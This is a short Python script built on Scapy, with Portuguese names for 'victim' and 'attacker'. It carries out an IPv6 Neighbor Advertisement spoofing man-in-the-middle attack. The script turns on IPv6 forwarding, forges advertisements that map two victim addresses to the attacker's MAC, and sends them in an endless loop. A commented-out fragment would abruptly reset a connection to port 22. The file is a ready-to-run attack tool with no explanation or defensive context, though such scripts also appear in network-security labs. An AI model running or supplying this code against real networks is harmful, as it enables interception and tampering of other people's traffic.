from scapy.all import *
import time
import os

def mitm(ip_vitima01, ip_vitima02, mac_atacante):

	print('[+] IPv6 Neighbor Advertisement Spoofing')
	
	os.system('echo 1 > /proc/sys/net/ipv6/conf/all/forwarding')
	
	ip01 = IPv6(src = ip_vitima01, dst = ip_vitima02)
	nd01 = ICMPv6ND_NA(tgt = ip_vitima01, R = 0)
	lla01 = ICMPv6NDOptDstLLAddr(lladdr = mac_atacante)
	pkt01 = ip01 / nd01 / lla01
	
	ip02 = IPv6(src = ip_vitima02, dst = ip_vitima01)
	nd02 = ICMPv6ND_NA(tgt = ip_vitima02, R = 0)
	lla02 = ICMPv6NDOptDstLLAddr(lladdr = mac_atacante)
	pkt02 = ip02 / nd02 / lla02
	
	while True:
		pkt01.show()
		send(pkt01, iface = 'enp4s0')
		pkt02.show()
		send(pkt02, iface = 'enp4s0')
		time.sleep(1)

#		s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM, 0)
#		s.connect((ip_vitima01, 22))
#		l_onoff = 1
#		l_linger = 0
#		s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', l_onoff, l_linger))
#		# send data here
#		s.close()

#ip_vitima01 = "2001:db8:0:1:d1:89ec:891:eba3"
#ip_vitima02 = "2001:1bcd:123:1:4c75:483:eb42:ba9c"

ip_vitima01 = "2001:db8:0:1:acc3:a921:762c:d319"
ip_vitima02 = "2001:db8:0:1:d1:89ec:891:eba3"

mac_atacante = "a4:1f:72:f5:90:50"

mitm(ip_vitima01, ip_vitima02, mac_atacante)
